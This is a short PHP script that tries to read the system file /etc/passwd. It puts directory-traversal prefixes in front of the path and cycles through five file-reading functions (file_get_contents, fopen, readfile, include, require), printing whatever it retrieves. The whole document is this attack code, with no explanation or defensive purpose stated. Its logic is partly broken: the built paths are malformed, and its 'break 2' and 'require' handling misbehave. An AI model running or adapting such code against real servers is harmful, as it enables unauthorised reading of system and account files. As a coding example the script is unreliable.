<?php
$file = '/etc/passwd';
$paths = array('../', '../../', '../../../', '../../../../');
$techniques = array('file_get_contents', 'fopen', 'readfile', 'include', 'require');

foreach ($paths as $path) {
    $fullPath = $path . $file;
    foreach ($techniques as $technique) {
        switch ($technique) {
            case 'file_get_contents':
                $content = @file_get_contents($fullPath);
                if ($content !== false) {
                    echo "File content using file_get_contents: " . $content;
                    break 2;
                }
                break;
            case 'fopen':
                $handle = @fopen($fullPath, 'r');
                if ($handle !== false) {
                    $content = fread($handle, filesize($fullPath));
                    fclose($handle);
                    echo "File content using fopen: " . $content;
                    break 2;
                }
                break;
            case 'readfile':
                if (@readfile($fullPath) !== false) {
                    break 2;
                }
                break;
            case 'include':
                if (@include($fullPath) !== false) {
                    break 2;
                }
                break;
            case 'require':
                if (@require($fullPath) !== false) {
                    break 2;
                }
                break;
        }
    }
}

if (!isset($content)) {
    echo "File not found.";
}
?>
